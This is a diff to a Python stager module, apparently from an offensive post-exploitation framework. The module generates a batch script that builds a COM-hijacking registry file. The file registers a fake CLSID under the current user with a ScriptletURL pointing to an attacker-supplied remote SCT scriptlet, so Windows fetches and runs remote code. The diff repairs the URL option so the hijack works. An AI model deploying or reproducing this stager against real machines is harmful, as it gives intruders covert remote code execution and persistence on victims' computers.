@@ -2,13 +2,13 @@
 class Stager:
 
     def __init__(self, mainMenu, params=[]):
-
+        
         self.info = {
             'Name': 'Bashrc file',
 
-            'Author': '@homjxie @subTee',
+            'Author': '@homjxi0e @subTee',
 
-            'Description': ('execute Stager in sct via COM-Hijacking|  echo @="">>COMHijack.reg'),
+            'Description': ('execute Stager in sct via COM-Hijacking '),
 
             'Comments': [
                 'https://twitter.com/homjxi0e'
@@ -31,14 +31,14 @@ class Stager:
                 'Value'         :   'python'
             },
             'OutFile' : {
-                'Description'   :   'File to output Bash script to, otherwise displayed on the screen.',
+                'Description'   :   'File Path.',
                 'Required'      :   True,
                 'Value'         :   '/tmp/COM.bat'
             },
-            'URL' : {
-                'Description'   :   '',
+            'URL-SCT' : {
+                'Description'   :   'URL To site file Sct',
                 'Required'      :   True,
-                'Value'         :   'echo @="URL the SCT your">>COMHijack.reg'
+                'Value'         :   ''
             },
             'SafeChecks' : {
                 'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
@@ -79,7 +79,7 @@ class Stager:
             return ""
 
 	if OutFile == "":
-            print Path.color("[!] Error In Path Man !!! .")
+            print Path.color("[!] Error In Path File Man !!! .")
             return ""
         else:
             code = "echo Windows Registry Editor Version 5.00>>COMHijack.reg\n"
@@ -98,8 +98,8 @@ class Stager:
             code += "echo \"ThreadingModel\"=\"Apartment\">>COMHijack.reg\n"
             code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID]>>COMHijack.reg\n"
             code += "echo @=\"AtomicRedTeam.1.00\">>COMHijack.reg\n"
-            code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL]>>COMHijack.reg \n"
-            code +=  "'\"" + self.options['URL']['Value'] + "\"'\n"
+            code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL]>>COMHijack.reg\n"
+            code += "echo @=\"" + self.options['URL-SCT']['Value'] + "\">>COMHijack.reg\n"
             code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID]>>COMHijack.reg\n"
             code += "echo @=\"AtomicRedTeam\">>COMHijack.reg\n"
             code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{372FCE38-4324-11D0-8810-00A0C903B83C}]>>COMHijack.reg\n"
